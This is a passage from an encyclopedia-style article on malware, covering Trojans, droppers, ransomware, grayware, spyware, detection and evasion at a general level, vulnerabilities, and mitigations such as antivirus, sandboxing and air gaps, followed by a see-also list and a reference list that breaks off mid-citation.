. Although their payload can be anything, many modern forms act as a backdoor, contacting a controller (phoning home) which can then have unauthorized access to the affected computer, potentially installing additional software such as a keylogger to steal confidential information, cryptomining software or adware to generate revenue to the operator of the trojan.
[
44
]
 While Trojan horses and backdoors are not easily detectable by themselves, computers may appear to run slower, emit more heat or fan noise due to heavy processor or network usage, as may occur when cryptomining software is installed. Cryptominers may limit resource usage and/or only run during idle times in an attempt to evade detection.

Unlike computer viruses and worms, Trojan horses generally do not attempt to inject themselves into other files or otherwise propagate themselves.
[
45
]


In spring 2017, Mac users were hit by the new version of Proton Remote Access Trojan (RAT)
[
46
]
 trained to extract password data from various sources, such as browser auto-fill data, the Mac-OS keychain, and password vaults.
[
47
]




Droppers
[
edit
]


Main article: 
Dropper (malware)


Droppers
 are a sub-type of Trojans that solely aim to deliver malware upon the system that they infect with the desire to subvert detection through stealth and a light payload.
[
48
]
 It is important not to confuse a dropper with a loader or stager. A loader or stager will merely load an extension of the malware (for example a collection of malicious functions through reflective dynamic link library injection) into memory. The purpose is to keep the initial stage light and undetectable. A dropper merely downloads further malware to the system.



Ransomware
[
edit
]


Main article: 
Ransomware
Ransomware prevents a user from accessing their files until a ransom is paid. There are two variations of ransomware, being crypto ransomware and locker ransomware.
[
49
]
 Locker ransomware just locks down a computer system without encrypting its contents, whereas crypto ransomware locks down a system and encrypts its contents. For example, programs such as 
CryptoLocker
 
encrypt
 files securely, and only decrypt them on payment of a substantial sum of money.
[
50
]


Lock-screens, or screen lockers is a type of "cyber police" ransomware that blocks screens on Windows or Android devices with a false accusation in harvesting illegal content, trying to scare the victims into paying up a fee.
[
51
]

Jisut and SLocker impact Android devices more than other lock-screens, with Jisut making up nearly 60 percent of all Android ransomware detections.
[
52
]


Encryption-based ransomware, like the name suggests, is a type of ransomware that encrypts all files on an infected machine. These types of malware then display a pop-up informing the user that their files have been encrypted and that they must pay (usually in Bitcoin) to recover them. Some examples of encryption-based ransomware are 
CryptoLocker
 and 
WannaCry
.
[
53
]




Click Fraud
[
edit
]


Some malware is used to generate money by 
click fraud
, making it appear that the computer user has clicked an advertising link on a site, generating a payment from the advertiser. It was estimated in 2012 that about 60 to 70% of all active malware used some kind of click fraud, and 22% of all ad-clicks were fraudulent.
[
54
]




Grayware
[
edit
]


See also: 
Privacy-invasive software
 and 
Potentially unwanted program


Grayware is any unwanted application or file that can worsen the performance of computers and may cause security risks but which there is insufficient consensus or data to classify them as malware.
[
32
]
 Types of greyware typically includes 
spyware
, 
adware
, 
fraudulent dialers
, joke programs ("jokeware") and 
remote access tools
.
[
38
]
 For example, at one point, 
Sony BMG
 compact discs 
silently installed a rootkit
 on purchasers' computers with the intention of preventing illicit copying.
[
55
]




Potentially unwanted program
[
edit
]


Potentially unwanted programs
 (PUPs) are applications that would be considered unwanted despite often being intentionally downloaded by the user.
[
56
]
 PUPs include spyware, adware, and fraudulent dialers.

Many security products classify unauthorised 
key generators
 as PUPs, although they frequently carry true malware in addition to their ostensible purpose.
[
57
]
 In fact, Kammerstetter et al. (2012)
[
57
]
 estimated that as much as 55% of key generators could contain malware and that about 36% malicious key generators were not detected by antivirus software.



Adware
[
edit
]


Some types of adware turn off anti-malware and virus protection; technical remedies are available.
[
58
]




Spyware
[
edit
]


Programs designed to monitor users' web browsing, display 
unsolicited advertisements
, or redirect 
affiliate marketing
 revenues are called 
spyware
. Spyware programs do not spread like viruses; instead they are generally installed by exploiting security holes. They can also be hidden and packaged together with unrelated user-installed software.
[
59
]
 The 
Sony BMG rootkit
 was intended to prevent illicit copying; but also reported on users' listening habits, and unintentionally created extra security vulnerabilities.
[
55
]




Detection
[
edit
]


Antivirus software typically uses two techniques to detect malware: (i) static analysis and (ii) dynamic/heuristic analysis.
[
60
]
 Static analysis involves studying the software code of a potentially malicious program and producing a signature of that program. This information is then used to compare scanned files by an antivirus program. Because this approach is not useful for malware that has not yet been studied, antivirus software can use dynamic analysis to monitor how the program runs on a computer and block it if it performs unexpected activity.

The aim of any malware is to conceal itself from detection by users or antivirus software.
[
1
]
 Detecting potential malware is difficult for two reasons. The first is that it is difficult to determine if software is malicious.
[
32
]
 The second is that malware uses technical measures to make it more difficult to detect it.
[
60
]
 An estimated 33% of malware is not detected by antivirus software.
[
57
]


The most commonly employed anti-detection technique involves encrypting the malware payload in order to prevent antivirus software from recognizing the signature.
[
32
]
 Tools such as crypters come with an encrypted blob of malicious code and a decryption stub. The stub decrypts the blob and loads it into memory. Because antivirus does not typically scan memory and only scans files on the drive, this allows the malware to evade detection. Advanced malware has the ability to transform itself into different variations, making it less likely to be detected due to the differences in its signatures. This is known as polymorphic malware. Other common techniques used to evade detection include, from common to uncommon:
[
61
]
 (1) evasion of analysis and detection by 
fingerprinting
 the environment when executed;
[
62
]
 (2) confusing automated tools' detection methods. This allows malware to avoid detection by technologies such as signature-based antivirus software by changing the server used by the malware;
[
61
]
 (3) timing-based evasion. This is when malware runs at certain times or following certain actions taken by the user, so it executes during certain vulnerable periods, such as during the boot process, while remaining dormant the rest of the time; (4) 
obfuscating
 internal data so that automated tools do not detect the malware;
[
63
]
 (v) information hiding techniques, namely 
stegomalware
;
[
64
]
 and (5) fileless malware which runs within memory instead of using files and utilizes existing system tools to carry out malicious acts. The use of existing binaries to carry out malicious activities is a technique known as LotL, or Living off the Land.
[
65
]
 This reduces the amount of forensic artifacts available to analyze. Recently these types of attacks have become more frequent with a 432% increase in 2017 and makeup 35% of the attacks in 2018. Such attacks are not easy to perform but are becoming more prevalent with the help of exploit-kits.
[
66
]
[
67
]




Risks
[
edit
]


Vulnerable software
[
edit
]


A 
vulnerability
 is a weakness, 
flaw
 or software bug in an 
application
, a complete computer, an 
operating system
, or a 
computer network
 that is exploited by malware to bypass defences or 
gain privileges
 it requires to run. For example, 
TestDisk 6.4
 or earlier contained a vulnerability that allowed attackers to inject code into Windows.
[
68
]
 Malware can exploit security defects (
security bugs
 or 
vulnerabilities
) in the operating system, applications (such as browsers, e.g. older versions of Microsoft Internet Explorer supported by Windows XP
[
69
]
), or in vulnerable versions of browser plugins such as 
Adobe Flash Player
, 
Adobe Acrobat or Reader
, or 
Java SE
.
[
70
]
[
71
]
 For example, a common method is exploitation of a 
buffer overrun
 vulnerability, where software designed to store data in a specified region of memory does not prevent more data than the buffer can accommodate from being supplied. Malware may provide data that overflows the buffer, with malicious 
executable
 code or data after the end; when this payload is accessed it does what the attacker, not the legitimate software, determines.

Malware can exploit recently discovered vulnerabilities before developers have had time to release a suitable 
patch
.
[
6
]
 Even when new patches addressing the vulnerability have been released, they may not necessarily be installed immediately, allowing malware to take advantage of systems lacking patches. Sometimes even applying patches or installing new versions does not automatically uninstall the old versions. 

There are several ways the users can stay informed and protected from security vulnerabilities in software.
Software providers often announce updates that address security issues.
[
72
]


Common vulnerabilities
 are assigned unique identifiers (CVE IDs) and listed in public databases like the 
National Vulnerability Database
.
Tools like Secunia PSI,
[
73
]
 free for personal use, can scan a computer for outdated software with known vulnerabilities and attempt to update them.

Firewalls
 and 
intrusion prevention systems
 can monitor the network traffic for suspicious activity that might indicate an attack.
[
74
]




Excessive privileges
[
edit
]


Users and programs can be assigned more 
privileges
 than they require, and malware can take advantage of this. For example, of 940 Android apps sampled, one third of them asked for more privileges than they required.
[
75
]
 Apps targeting the 
Android
 platform can be a major source of malware infection but one solution is to use third-party software to detect apps that have been assigned excessive privileges.
[
76
]


Some systems allow all users to make changes to the core components or settings of the system, which is considered 
over-privileged
 access today. This was the standard operating procedure for early microcomputer and home computer systems, where there was no distinction between an 
administrator
 or 
root
, and a regular user of the system. In some systems, 
non-administrator
 users are over-privileged by design, in the sense that they are allowed to modify internal structures of the system. In some environments, users are over-privileged because they have been inappropriately granted administrator or equivalent status.
[
77
]
 This can be because users tend to demand more privileges than they need, so often end up being assigned unnecessary privileges.
[
78
]


Some systems allow code executed by a user to access all rights of that user, which is known as over-privileged code. This was also standard operating procedure for early microcomputer and home computer systems. Malware, running as over-privileged code, can use this privilege to subvert the system. Almost all currently popular operating systems, and also many 
scripting applications
 allow code too many privileges, usually in the sense that when a user 
executes
 code, the system allows that code all rights of that user.
[
citation needed
]




Weak passwords
[
edit
]


A credential attack occurs when a user account with administrative privileges is cracked and that account is used to provide malware with appropriate privileges.
[
79
]
 Typically, the attack succeeds because the weakest form of account security is used, which is typically a short password that can be cracked using a 
dictionary
 or 
brute force
 attack. Using 
strong passwords
 and enabling 
two-factor authentication
 can reduce this risk. With the latter enabled, even if an attacker can crack the password, they cannot use the account without also having the token possessed by the legitimate user of that account.



Use of the same operating system
[
edit
]


Homogeneity can be a vulnerability. For example, when all computers in a 
network
 run the same operating system, upon exploiting one, one 
worm
 can exploit them all:
[
80
]
 In particular, 
Microsoft Windows
 or 
Mac OS X
 have such a large share of the market that an exploited vulnerability concentrating on either operating system could subvert a large number of systems. It is estimated that approximately 83% of malware infections between January and March 2020 were spread via systems running 
Windows 10
.
[
81
]
 This risk is mitigated by segmenting the networks into different 
subnetworks
 and setting up 
firewalls
 to block traffic between them.
[
82
]
[
83
]




Mitigation
[
edit
]


Antivirus / Anti-malware software
[
edit
]


Anti-malware (sometimes also called 
antivirus
) programs block and remove some or all types of malware. For example, 
Microsoft Security Essentials
 (for Windows XP, Vista, and Windows 7) and 
Windows Defender
 (for 
Windows 8
, 
10
 and 
11
) provides real-time protection. The 
Windows Malicious Software Removal Tool
 removes malicious software from the system.
[
84
]
 Additionally, several capable antivirus software programs are available for free download from the Internet (usually restricted to non-commercial use).
[
85
]
 Tests found some free programs to be competitive with commercial ones.
[
85
]
[
86
]
[
87
]


Typically, antivirus software can combat malware in the following ways:



Real-time protection:
 They can provide real time protection against the installation of malware software on a computer. This type of malware protection works the same way as that of antivirus protection in that the anti-malware software scans all incoming 
network
 data for malware and blocks any 
threats
 it comes across.


Removal:
 Anti-malware software programs can be used solely for detection and removal of malware software that has already been installed onto a computer. This type of anti-malware software scans the contents of the Windows registry, operating system files, and installed programs on a computer and will provide a list of any threats found, allowing the user to choose which files to delete or keep, or to compare this list to a list of known malware components, removing files that match.
[
88
]
[
failed verification
]


Sandboxing:
 
Sandboxing
 confines applications within a controlled environment, restricting their operations and isolating them from other applications on the host while limiting access to 
system resources
.
[
89
]
 Browser sandboxing isolates web processes to prevent malware and exploits, enhancing security.
[
90
]


Real-time protection
[
edit
]


A specific component of anti-malware software, commonly referred to as an on-access or real-time scanner, hooks deep into the operating system's core or 
kernel
 and functions in a manner similar to how certain malware itself would attempt to operate, though with the user's informed permission for protecting the system. Any time the operating system accesses a file, the on-access scanner checks if the file is infected or not. Typically, when an infected file is found, execution is stopped and the file is 
quarantined
 to prevent further damage with the intention to prevent irreversible system damage. Most AVs allow users to override this behaviour. This can have a considerable performance impact on the operating system, though the degree of impact is dependent on how many pages it creates in 
virtual memory
.
[
91
]




Sandboxing
[
edit
]


Sandboxing
 is a 
security model
 that confines applications within a controlled environment, restricting their operations to authorized "safe" actions and isolating them from other applications on the host. It also limits access to system resources like memory and the file system to maintain isolation.
[
89
]


Browser sandboxing is a security measure that isolates web browser processes and tabs from the operating system to prevent malicious code from exploiting vulnerabilities.
It helps protect against malware, 
zero-day exploits
, and unintentional data leaks by trapping potentially harmful code within the sandbox.
It involves creating separate processes, limiting access to system resources, running 
web content
 in isolated processes, monitoring system calls, and memory constraints.

Inter-process communication
 (IPC) is used for 
secure communication
 between processes.
Escaping the sandbox involves targeting vulnerabilities in the sandbox mechanism or the operating system's sandboxing features.
[
90
]
[
92
]


While sandboxing is not foolproof, it significantly reduces the 
attack surface
 of common threats.
Keeping browsers and operating systems updated is crucial to mitigate vulnerabilities.
[
90
]
[
92
]




Website security scans
[
edit
]


Website vulnerability scans check the website, detect malware, may note outdated software, and may report known security issues, in order to reduce the risk of the site being compromised.



Network Segregation
[
edit
]


Structuring a network as a set of smaller networks, and limiting the flow of traffic between them to that known to be legitimate, can hinder the ability of infectious malware to replicate itself across the wider network. 
Software-defined networking
 provides techniques to implement such controls.



"Air gap" isolation or "parallel network"
[
edit
]


As a last resort, computers can be protected from malware, and the risk of infected computers disseminating trusted information can be greatly reduced by imposing an 
"air gap"
 (i.e. completely disconnecting them from all other networks) and applying enhanced controls over the entry and exit of software and data from the outside world. However, malware can still cross the air gap in some situations, not least due to the need to introduce software into the air-gapped network and can damage the availability or integrity of assets thereon. 
Stuxnet
 is an example of malware that is introduced to the target environment via a USB drive, causing damage to processes supported on the environment without the need to exfiltrate data.

AirHopper,
[
93
]
 BitWhisper,
[
94
]
 GSMem
[
95
]
 and Fansmitter
[
96
]
 are four techniques introduced by researchers that can leak data from air-gapped computers using electromagnetic, thermal and acoustic emissions.



Research
[
edit
]


Utilizing bibliometric analysis, the study of malware research trends from 2005 to 2015, considering criteria such as impact journals, highly cited articles, research areas, number of publications, keyword frequency, institutions, and authors, revealed an annual growth rate of 34.1%. 
North America
 led in research output, followed by 
Asia
 and 
Europe
. 
China
 and 
India
 were identified as emerging contributors.
[
97
]




See also
[
edit
]




Botnet


Browser hijacking


Comparison of antivirus software


Computer security


Cryptojacking


Cryptovirology


Cuckoo's egg
 (metaphor)


Cybercrime


Cyber spying


Domain generation algorithm


Facebook malware


File binder


Identity theft


Industrial espionage


Linux malware


Malvertising


Phishing


Point-of-sale malware


Hacktivism


Riskware


Security in Web apps


Social engineering (security)


Targeted threat


Technical support scam


Telemetry software


Typosquatting


Web server overload causes


Webattacker


Zombie (computer science)




References
[
edit
]






^ 
a
 
b
 
c
 
d
 
e
 
Tahir, R. (2018). 
A study on malware and malware detection techniques
. 
Archived
 10 January 2023 at the 
Wayback Machine
. 
International Journal of Education and Management Engineering
, 
8
(2), 20.




^
 
"An Undirected Attack Against Critical Infrastructure"
 
(PDF)
. 
United States Computer Emergency Readiness Team
(Us-cert.gov). 
Archived
 
(PDF)
 from the original on 24 December 2016
. Retrieved 
28 September
 2014
.




^ 
a
 
b
 
Cani, Andrea; Gaudesi, Marco; Sanchez, Ernesto; Squillero, Giovanni; Tonda, Alberto (24 March 2014). 
"Towards automated malware creation"
. 
Proceedings of the 29th Annual ACM Symposium on Applied Computing
. SAC '14. New York, NY, USA: Association for Computing Machinery. pp. 157–160. 
doi
:
10.1145/2554850.2555157
. 
ISBN
 
978-1-4503-2469-4
. 
S2CID
 
14324560
.




^
 
Brewer, Ross (1 September 2016). 
"Ransomware attacks: detection, prevention and cure"
. 
Network Security
. 
2016
 (9): 5–9. 
doi
:
10.1016/S1353-4858(16)30086-1
. 
ISSN
 
1353-4858
. 
Archived
 from the original on 10 April 2019
. Retrieved 
2 December
 2021
.




^
 
Zhong, Fangtian; Chen, Zekai; Xu, Minghui; Zhang, Guoming; Yu, Dongxiao; 
Cheng, Xiuzhen
 (2022). 
"Malware-on-the-Brain: Illuminating Malware Byte Codes with Images for Malware Classification"
. 
IEEE Transactions on Computers
. 
72
 (2): 438–451. 
arXiv
:
2108.04314
. 
doi
:
10.1109/TC.2022.3160357
. 
ISSN
 
0018-9340
. 
S2CID
 
236965755
. 
Archived
 from the original on 2 September 2022
. Retrieved 
2 September
 2022
.




^ 
a
 
b
 
Kim, Jin-Young; Bu, Seok-Jun; Cho, Sung-Bae (1 September 2018). 
"Zero-day malware detection using transferred generative adversarial networks based on deep autoencoders"
. 
Information Sciences
. 460–461: 83–102. 
doi
:
10.1016/j.ins.2018.04.092
. 
ISSN
 
0020-0255
. 
S2CID
 
51882216
. 
Archived
 from the original on 23 June 2020
. Retrieved 
2 December
 2021
.




^
 
Razak, Mohd Faizal Ab; Anuar, Nor Badrul; Salleh, Rosli; Firdaus, Ahmad (1 November 2016). 
"The rise of "malware": Bibliometric analysis of malware study"
. 
Journal of Network and Computer Applications
. 
75
: 58–76. 
doi
:
10.1016/j.jnca.2016.08.022
. 
Archived
 from the original on 26 June 2022
. Retrieved 
30 April
 2022
.




^ 
a
 
b
 
Xiao, Fei; Sun, Yi; Du, Donggao; Li, Xuelei; Luo, Min (21 March 2020). 
"A Novel Malware Classification Method Based on Crucial Behavior"
. 
Mathematical Problems in Engineering
. 
2020
: 1–12. 
doi
:
10.1155/2020/6804290
. 
ISSN
 
1024-123X
.




^
 
Morgan, Steve (13 November 2020). 
"Cybercrime To Cost The World $10.5 Trillion Annually By 2025"
. 
Cybercrime magazine website
. Cybersecurity ventures. 
Archived
 from the original on 5 March 2022
. Retrieved 
5 March
 2022
.




^
 
Eder-Neuhauser, Peter; Zseby, Tanja; Fabini, Joachim (1 June 2019). 
"Malware propagation in smart grid networks: metrics, simulation and comparison of three malware types"
. 
Journal of Computer Virology and Hacking Techniques
. 
15
 (2): 109–125. 
doi
:
10.1007/s11416-018-0325-y
. 
ISSN
 
2263-8733
. 
S2CID
 
255164530
.




^
 
John von Neumann, "Theory of Self-Reproducing Automata", Part 1: Transcripts of lectures given at the University of Illinois, December 1949, Editor: A. W. Burks, University of Illinois, USA, 1966.




^
 
Fred Cohen, "Computer Viruses", PhD Thesis, University of Southern California, ASP Press, 1988.




^
 
Young, Adam; Yung, Moti (2004). 
Malicious cryptography - exposing cryptovirology
. Wiley. pp. 
1
–392. 
ISBN
 
978-0-7645-4975-5
.




^
 
Avoine, Gildas; Pascal Junod; Philippe Oechslin (2007). 
Computer system security: basic concepts and solved exercises
. EFPL Press. p. 20. 
ISBN
 
978-1-4200-4620-5
. 
The first PC virus is credited to two brothers, Basit Farooq Alvi and Amjad Farooq Alvi, from Pakistan




^ 
a
 
b
 
"USB devices spreading viruses"
. 
CNET
. CBS Interactive. 
Archived
 from the original on 24 September 2015
. Retrieved 
18 February
 2015
.




^
 
2018 Data Breach Investigations Report
 
(PDF)
 (Report) (11th ed.). Verizon. 2018. p. 18. 
Archived
 
(PDF)
 from the original on 16 October 2021
. Retrieved 
26 September
 2022
.




^
 
Fruhlinger, Josh (10 October 2018). 
"Top cybersecurity facts, figures and statistics for 2018"
. 
CSO Online
. 
Archived
 from the original on 2 June 2019
. Retrieved 
20 January
 2020
.




^
 
William A Hendric (4 September 2014). 
"Computer Virus history"
. 
The Register
. 
Archived
 from the original on 10 May 2018
. Retrieved 
29 March
 2015
.




^
 
"Cryptomining Worm MassMiner Exploits Multiple Vulnerabilities - Security Boulevard"
. 
Security Boulevard
. 2 May 2018. 
Archived
 from the original on 9 May 2018
. Retrieved 
9 May
 2018
.




^
 
"Beware of Word Document Viruses"
. 
us.norton.com
. 
Archived
 from the original on 26 September 2017
. Retrieved 
25 September
 2017
.




^
 
Tipton, Harold F. (26 December 2002). 
Information Security Management Handbook
. CRC Press. 
ISBN
 
978-1-4200-7241-9
. 
Archived
 from the original on 27 February 2023
. Retrieved 
16 November
 2020
.




^
 
"Malware"
. FEDERAL TRADE COMMISSION- CONSUMER INFORMATION. 
Archived
 from the original on 20 March 2017
. Retrieved 
27 March
 2014
.




^
 
Hernandez, Pedro. 
"Microsoft Vows to Combat Government Cyber-Spying"
. 
eWeek
. Archived from 
the original
 on 23 January 2014
. Retrieved 
15 December
 2013
.




^
 
"Malware Revolution: A Change in Target"
. March 2007. 
Archived
 from the original on 16 October 2008
. Retrieved 
26 August
 2017
.




^
 
"Child Porn: Malware's Ultimate Evil"
. November 2009. 
Archived
 from the original on 22 October 2013
. Retrieved 
22 November
 2010
.




^
 
PC World – Zombie PCs: Silent, Growing Threat
 
Archived
 27 July 2008 at the 
Wayback Machine
.




^
 
Kovacs, Eduard (27 February 2013). 
"MiniDuke Malware Used Against European Government Organizations"
. Softpedia. 
Archived
 from the original on 11 October 2016
. Retrieved 
27 February
 2013
.




^
 
Claburn, Thomas (26 October 2022). 
"Ukrainian indicted by US govt on cybercrime charges"
. 
theregister.com
. 
Archived
 from the original on 26 October 2022
. Retrieved 
27 October
 2022
. 
Those deploying Raccoon used phishing messages and other tricks to get the malware onto potentially millions of victims' computers worldwide. Once installed, the code provided access to login credentials and other data stored on the compromised system.




^
 
"Raccoon Infostealer Disclosure"
. 
raccoon.ic3.gov
. 
Archived
 from the original on 27 February 2023
. Retrieved 
27 October
 2022
.




^
 
"Shamoon is latest malware to target energy sector"
. 
Archived
 from the original on 23 September 2015
. Retrieved 
18 February
 2015
.




^
 
"Computer-killing malware used in Sony attack a wake-up call"
. 
Archived
 from the original on 7 December 2017
. Retrieved 
18 February
 2015
.




^ 
a
 
b
 
c
 
d
 
e
 
Molina-Coronado, Borja; Mori, Usue; Mendiburu, Alexander; Miguel-Alonso, Jose (1 January 2023). 
"Towards a fair comparison and realistic evaluation framework of android malware detectors based on static analysis and machine learning"
. 
Computers & Security
. 
124
: 102996. 
arXiv
:
2205.12569
. 
doi
:
10.1016/j.cose.2022.102996
. 
ISSN
 
0167-4048
. 
S2CID
 
252734950
. 
Archived
 from the original on 10 January 2023
. Retrieved 
10 January
 2023
.




^
 
"What are viruses, worms, and Trojan horses?"
. 
Indiana University
. The Trustees of Indiana University. 
Archived
 from the original on 4 September 2016
. Retrieved 
23 February
 2015
.




^
 
Peter Szor (3 February 2005). 
The Art of Computer Virus Research and Defense
. Pearson Education. p. 204. 
ISBN
 
978-0-672-33390-3
.




^
 
"computer virus – Encyclopædia Britannica"
. 
Britannica.com
. 
Archived
 from the original on 13 May 2013
. Retrieved 
28 April
 2013
.




^
 
McDowell, Mindi. 
"Understanding Hidden Threats: Rootkits and Botnets"
. US-CERT. 
Archived
 from the original on 29 March 2017
. Retrieved 
6 February
 2013
.




^
 
"The Meaning of 'Hack'
"
. Catb.org. 
Archived
 from the original on 13 October 2016
. Retrieved 
15 April
 2010
.




^ 
a
 
b
 
Gill, Harjeevan (21 June 2022), 
Malware: Types, Analysis and Classifications
, 
doi
:
10.31224/2423
, retrieved 
22 June
 2024




^
 
Staff, SPIEGEL (29 December 2013). 
"Inside TAO: Documents Reveal Top NSA Hacking Unit"
. 
Spiegel Online
. SPIEGEL. 
Archived
 from the original on 20 April 2017
. Retrieved 
23 January
 2014
.




^
 
Edwards, John. 
"Top Zombie, Trojan Horse and Bot Threats"
. IT Security. Archived from 
the original
 on 9 February 2017
. Retrieved 
25 September
 2007
.




^
 
Appelbaum, Jacob (29 December 2013). 
"Shopping for Spy Gear:Catalog Advertises NSA Toolbox"
. 
Spiegel Online
. SPIEGEL. 
Archived
 from the original on 20 April 2017
. Retrieved 
29 December
 2013
.




^
 
Landwehr, C. E; A. R Bull; J. P McDermott; W. S Choi (1993). 
A taxonomy of computer program security flaws, with examples
 
(PDF)
. DTIC Document. 
Archived
 from the original on 8 April 2013
. Retrieved 
5 April
 2012
.




^
 
"Trojan Horse: [coined By MIT-hacker-turned-NSA-spook Dan Edwards] N."
 Archived from 
the original
 on 5 July 2017
. Retrieved 
5 April
 2012
.




^
 
"What is the difference between viruses, worms, and Trojan horses?"
. Symantec Corporation. Archived from 
the original
 on 13 February 2015
. Retrieved 
10 January
 2009
.




^
 
"VIRUS-L/comp.virus Frequently Asked Questions (FAQ) v2.00 (Question B3: What is a Trojan Horse?)"
. 9 October 1995. 
Archived
 from the original on 24 September 2015
. Retrieved 
13 September
 2012
.




^
 
"Proton Mac Trojan Has Apple Code Signing Signatures Sold to Customers for $50k"
. AppleInsider. 14 March 2017. 
Archived
 from the original on 19 October 2017
. Retrieved 
19 October
 2017
.




^
 
"Non-Windows Malware"
. Betanews. 24 August 2017. 
Archived
 from the original on 20 October 2017
. Retrieved 
19 October
 2017
.




^
 
"Trojan Dropper"
. MalwareBytes. 30 January 2020. 
Archived
 from the original on 31 October 2022
. Retrieved 
31 October
 2022
.




^
 
Richardson, Ronny; North, Max (1 January 2017). 
"Ransomware: Evolution, Mitigation and Prevention"
. 
International Management Review
. 
13
 (1): 10–21. 
Archived
 from the original on 5 October 2022
. Retrieved 
23 November
 2019
.




^
 
Fruhlinger, Josh (1 August 2017). 
"The 5 biggest ransomware attacks of the last 5 years"
. CSO. 
Archived
 from the original on 24 March 2018
. Retrieved 
23 March
 2018
.




^
 
"Rise of Android Ransomware, research"
 
(PDF)
. 
ESET
. 
Archived
 
(PDF)
 from the original on 19 October 2017
. Retrieved 
19 October
 2017
.




^
 
"State of Malware, research"
 
(PDF)
. 
Malwarebytes
. 
Archived
 
(PDF)
 from the original on 21 May 2017
. Retrieved 
19 October
 2017
.




^
 
O'Kane, Philip; Sezer, Sakir; Carlin, Domhnall (2018). "Evolution of ransomware". 
IET Networks
. 
7
 (5): 321–327. 
doi
:
10.1049/iet-net.2017.0207
. 
ISSN
 
2047-4954
.




^
 
"Another way Microsoft is disrupting the malware ecosystem"
. Archived from 
the original
 on 20 September 2015
. Retrieved 
18 February
 2015
.




^ 
a
 
b
 
Russinovich, Mark (31 October 2005). 
"Sony, Rootkits and Digital Rights Management Gone Too Far"
. 
Mark's Blog
. Microsoft MSDN. 
Archived
 from the original on 2 June 2012
. Retrieved 
29 July
 2009
.




^
 
"Rating the best anti-malware solutions"
. Arstechnica. 15 December 2009. 
Archived
 from the original on 2 February 2014
. Retrieved 
28 January
 2014
.




^ 
a
 
b
 
c
 
Kammerstetter, Markus; Platzer, Christian; Wondracek, Gilbert (16 October 2012). 
"Vanity, cracks and malware"
. 
Proceedings of the 2012 ACM conference on Computer and communications security
. CCS '12. New York, NY, USA: Association for Computing Machinery. pp. 809–820. 
doi
:
10.1145/2382196.2382282
. 
ISBN
 
978-1-4503-1651-4
. 
S2CID
 
3423843
.




^
 
Casey, Henry T.
 (25 November 2015). 
"Latest adware disables antivirus software"
. 
Tom's Guide
. 
Yahoo.com
. 
Archived
 from the original on 27 November 2015
. Retrieved 
25 November
 2015
.




^
 
"Peer To Peer Information"
. NORTH CAROLINA STATE UNIVERSITY. 
Archived
 from the original on 2 July 2015
. Retrieved 
25 March
 2011
.




^ 
a
 
b
 
Si̇ngh, Jagsir; Si̇ngh, Jaswinder (1 September 2018). 
"Challenge of Malware Analysis: Malware obfuscation Techniques"
. 
International Journal of Information Security Science
. 
7
 (3): 100–110. 
Archived
 from the original on 10 January 2023
. Retrieved 
10 January
 2023
.




^ 
a
 
b
 
The Four Most Common Evasive Techniques Used by Malware
 
Archived
 29 May 2021 at the 
Wayback Machine
. 27 April 2015.




^
 
Kirat, Dhilung; Vigna, Giovanni; Kruegel, Christopher (2014). 
Barecloud: bare-metal analysis-based evasive malware detection
. ACM. pp. 287–301. 
ISBN
 
978-1-931971-15-7
. 
Archived
 from the original on 1 August 2019
. Retrieved 
28 November
 2018
.
 
 Freely accessible at: 
"Barecloud: bare-metal analysis-based evasive malware detection"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on 4 March 2016
. Retrieved 
28 November
 2018
.




^
 
Young, Adam; Yung, Moti (1997). "Deniable Password Snatching: On the Possibility of Evasive Electronic Espionage". 
Symp. on Security and Privacy
. IEEE. pp. 224–235. 
ISBN
 
0-8186-7828-3
.




^
 
Cabaj, Krzysztof; Caviglione, Luca; Mazurczyk, Wojciech; Wendzel, Steffen; Woodward, Alan; Zander, Sebastian (May 2018). "The New Threats of Information Hiding: The Road Ahead". 
IT Professional
. 
20
 (3): 31–39. 
arXiv
:
1801.00694
. 
doi
:
10.1109/MITP.2018.032501746
. 
S2CID
 
22328658
.




^
 
Sudhakar; Kumar, Sushil (14 January 2020). 
"An emerging threat Fileless malware: a survey and research challenges"
. 
Cybersecurity
. 
3
 (1): 1. 
doi
:
10.1186/s42400-019-0043-x
. 
ISSN
 
2523-3246
. 
S2CID
 
257111442
.




^
 
"Penn State WebAccess Secure Login"
. 
webaccess.psu.edu
. 
doi
:
10.1145/3365001
. 
S2CID
 
219884145
. Archived from 
the original
 on 8 March 2021
. Retrieved 
29 February
 2020
.




^
 
"Malware Dynamic Analysis Evasion Techniques: A Survey"
. 
ResearchGate
. 
Archived
 from the original on 14 April 2021
. Retrieved 
29 February
 2020
.




^
 
Nemeth, Zoltan L. (2015). 
"Modern binary attacks and defences in the windows environment — Fighting against microsoft EMET in seven rounds"
. 
2015 IEEE 13th International Symposium on Intelligent Systems and Informatics (SISY)
. pp. 275–280. 
doi
:
10.1109/SISY.2015.7325394
. 
ISBN
 
978-1-4673-9388-1
. 
S2CID
 
18914754
.




^
 
"Global Web Browser... Security Trends"
 
(PDF)
. Kaspersky lab. November 2012. 
Archived
 
(PDF)
 from the original on 2 February 2013
. Retrieved 
17 January
 2013
.




^
 
Rashid, Fahmida Y. (27 November 2012). 
"Updated Browsers Still Vulnerable to Attack if Plugins Are Outdated"
. pcmag.com. Archived from 
the original
 on 9 April 2016
. Retrieved 
17 January
 2013
.




^
 
Danchev, Dancho (18 August 2011). 
"Kaspersky: 12 different vulnerabilities detected on every PC"
. pcmag.com. Archived from 
the original
 on 5 July 2014
. Retrieved 
17 January
 2013
.




^
 
"Adobe Security bulletins and advisories"
. Adobe.com. 
Archived
 from the original on 15 November 2013
. Retrieved 
19 January
 2013
.




^
 
Rubenking, Neil J. 
"Secunia Personal Software Inspector 3.0 Review & Rating"
. 
PCMag.com
. 
Archived
 from the original on 16 January 2013
. Retrieved 
19 January
 2013
.




^
 
Morales, Jose Andre; Al-Bataineh, Areej; Xu, Shouhuai; Sandhu, Ravi (2010). 
"Analyzing and Exploiting Network Behaviors of Malware"
. In Jajodia, Sushil; Zhou, Jianying (eds.). 
Security and Privacy in Communication Networks
. Lecture Notes of the Institute for Computer Sciences, Social Informatics and Telecommunications Engineering. Vol. 50. Berlin, Heidelberg: Springer. pp. 20–34. 
doi
:
10.1007/978-3-642-16161-2_2
. 
ISBN
 
978-3-642-16161-2
. 
Archived
 from the original on 2 December 2021
. Retrieved 
2 December
 2021
.




^
 
Felt, Adrienne Porter
; Chin, Erika; Hanna, Steve; Song, Dawn; Wagner, David (17 October 2011). 
"Android permissions demystified"
. 
Proceedings of the 18th ACM conference on Computer and communications security
. CCS '11. New York, NY, USA: Association for Computing Machinery. pp. 627–638. 
doi
:
